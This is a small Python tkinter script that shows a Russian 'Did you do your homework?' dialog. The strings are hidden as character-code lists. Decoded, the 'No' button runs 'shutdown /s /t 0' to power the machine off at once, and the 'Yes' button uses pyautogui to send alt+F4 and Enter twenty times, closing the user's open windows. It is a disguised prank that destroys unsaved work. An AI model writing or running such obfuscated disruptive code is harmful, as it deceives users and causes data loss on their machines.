from tkinter import *
import os
import tkinter.messagebox as messagebox
import pyautogui as p
import time
s = [115,104,117,116,100,111,119,110,32,47,115,32,47,116,32,48]
sd = "".join([chr(i) for i in s])
t = [116,97,98]
td = "".join([chr(i) for i in t])
f = [102,52]
fd = "".join([chr(i) for i in f])
a = [97,108,116]
ad = "".join([chr(i) for i in a])
e = [101,110,116,101,114]
ed = "".join([chr(i) for i in e])
sh = [115,104,105,102,116]
shd = "".join([chr(i) for i in sh])
def cw():
    for i in range(20):
        p.hotkey(ad,shd,td)
        p.hotkey(ad,fd)
        p.press(ed)
        time.sleep(0.1)  
    time.sleep(0.5)  
def sdd():
    os.system(sd)
root = Tk()
root.geometry("400x200") 
frame = Frame(root)
frame.pack(pady=20)
label = Label(frame,text="Сделал дз?",font=("Arial",18))
label.pack()
btn_sdd = Button(root,text="Нет",command=sdd,font=("Arial",14))
btn_sdd.pack(pady=10)
btn_cw = Button(root,text="Да",command=cw,font=("Arial",14))
btn_cw.pack()
root.mainloop()
